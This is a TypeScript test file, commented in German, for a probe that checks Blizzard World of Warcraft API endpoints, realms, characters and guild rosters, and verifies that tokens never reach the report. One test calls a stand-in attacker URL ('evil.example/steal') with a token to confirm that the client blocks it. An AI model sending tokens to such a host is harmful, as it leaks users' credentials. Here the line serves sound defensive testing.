import { describe, expect, it, vi } from 'vitest'
import { createBlizzardClient } from '../../server/providers/blizzard/client'
import { describeFields, findStaticNamespace, runBlizzardProbe, sampleOf, toProbeCharacter } from '../../server/providers/blizzard/probe'

const json = (body: unknown, status = 200) => new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } })

/** Antworten je Pfad (ohne Query); alles andere 404 */
function fakeBlizzard(routes: Record<string, unknown | [unknown, number]>) {
  const calls: { url: string, auth: string | null }[] = []
  const fetch = vi.fn(async (input: string, init?: RequestInit) => {
    const url = new URL(input)
    calls.push({ url: input, auth: (init?.headers as Record<string, string> | undefined)?.Authorization ?? null })
    if (url.pathname === '/token') return json({ access_token: 'app', expires_in: 3600 })
    const route = routes[url.pathname]
    if (route === undefined) return json({ code: 404 }, 404)
    return Array.isArray(route) ? json(route[0], route[1] as number) : json(route)
  })
  return { fetch, calls }
}

const account = {
  wow_accounts: [{
    characters: [{
      name: 'Nak', surname: 'Totembart', level: 14, id: 777,
      realm: { id: 5001, slug: 'forever-normal' },
      playable_class: { name: 'Schamane' }, playable_race: { name: 'Zwerg' },
      character: { href: 'https://eu.api.blizzard.com/profile/wow/character/nak-totembart?namespace=profile-forever-eu' },
      protected_character: { href: 'https://eu.api.blizzard.com/profile/user/wow/protected-character/5001-777?namespace=profile-forever-eu' },
    }],
  }],
  _links: { self: { href: 'https://eu.api.blizzard.com/x?namespace=static-1.60.1_70399-forever-eu' } },
}

describe('Blizzard-API-Probe', () => {
  it('testet Account, Profil, Unterseiten und Gildenliste und meldet Status + Felder', async () => {
    const { fetch, calls } = fakeBlizzard({
      '/data/wow/realm/index': { realms: [{ id: 5001, name: 'Normal', slug: 'forever-normal' }] },
      '/profile/user/wow': account,
      '/profile/user/wow/protected-character/5001-777': { character: {} },
      '/data/wow/playable-class/index': [{}, 403],
      '/profile/wow/character/forever-normal/nak': { name: 'Nak', level: 14, guild: { key: { href: 'https://eu.api.blizzard.com/data/wow/guild/miinyu-gilde?namespace=profile-forever-eu' }, name: 'Miinyu' } },
      '/profile/wow/character/forever-normal/nak/equipment': { equipped_items: [{ slot: 'HEAD' }] },
      '/data/wow/guild/miinyu-gilde/roster': { members: [{ character: { name: 'Nak' }, rank: 0 }, { character: {}, rank: 1 }] },
    })
    const client = createBlizzardClient({ clientId: 'id', clientSecret: 'secret', region: 'eu' }, { fetch })
    const report = await runBlizzardProbe(client, { region: 'eu', userToken: 'user-token', now: () => new Date('2026-11-06T12:00:00Z') })
    const byId = Object.fromEntries(report.checks.map(check => [check.id, check]))

    expect(byId['app-token']!.result).toBe('ok')
    expect(report.realms).toEqual([{ id: 5001, name: 'Normal', slug: 'forever-normal' }])
    expect(report.accountCharacters[0]).toMatchObject({ name: 'Nak Totembart', level: 14, characterId: 777, realmId: 5001, className: 'Schamane' })
    expect(byId['protected-character']!.result).toBe('ok')
    expect(byId['static-plain']!.result).toBe('forbidden')
    expect(report.namespaces.static).toBe('static-1.60.1_70399-forever-eu')
    expect(byId['character-realmless']!.result).toBe('missing')
    expect(byId['character-realm']!.result).toBe('ok')
    expect(byId['character-equipment']).toMatchObject({ result: 'ok', fields: ['equipped_items', 'equipped_items[].slot'] })
    expect(byId['character-professions']!.result).toBe('missing')
    expect(report.guild).toEqual({ slug: 'miinyu-gilde', source: 'character', memberCount: 2 })

    // Nutzer-Token nur für Account-Endpunkte, nie im Bericht
    expect(calls.filter(call => call.auth === 'Bearer user-token').every(call => call.url.includes('/profile/user/wow'))).toBe(true)
    expect(JSON.stringify(report)).not.toContain('user-token')
    expect(JSON.stringify(report)).not.toContain('secret')
  })

  it('bricht ohne App-Token verständlich ab', async () => {
    const fetch = vi.fn(async () => json({ error: 'invalid_client' }, 401))
    const report = await runBlizzardProbe(createBlizzardClient({ clientId: 'x', clientSecret: 'y', region: 'eu' }, { fetch }), { region: 'eu' })
    expect(report.checks).toHaveLength(1)
    expect(report.checks[0]).toMatchObject({ result: 'forbidden', note: expect.stringContaining('Client-ID') })
  })

  it('schickt Tokens nur an Blizzard-API-Hosts', async () => {
    const fetch = vi.fn(async () => json({}))
    const client = createBlizzardClient({ clientId: 'x', clientSecret: 'y', region: 'eu' }, { fetch })
    const response = await client.get('https://evil.example/steal', null, 'token')
    expect(response.status).toBe(0)
    expect(fetch).not.toHaveBeenCalled()
  })

  it('liest Hilfsdaten aus Antworten', () => {
    expect(findStaticNamespace(account)).toBe('static-1.60.1_70399-forever-eu')
    expect(describeFields({ members: [{ a: 1 }], _links: {} })).toEqual(['members', 'members[].a'])
    expect(toProbeCharacter({ name: { de_DE: 'Ana' }, surname: 'Forever' }).name).toBe('Ana Forever')
    expect(sampleOf('character-realmless', { level: 14, ruleset: 'normal', money: 99 })).toBe('{"level":14,"ruleset":"normal"}')
    expect(sampleOf('character-encounters-dungeons', { character: {}, expansions: [] })).toBe('{"expansions":[]}')
    expect(sampleOf('character-equipment', { a: 1 })).toBeUndefined()
  })
})
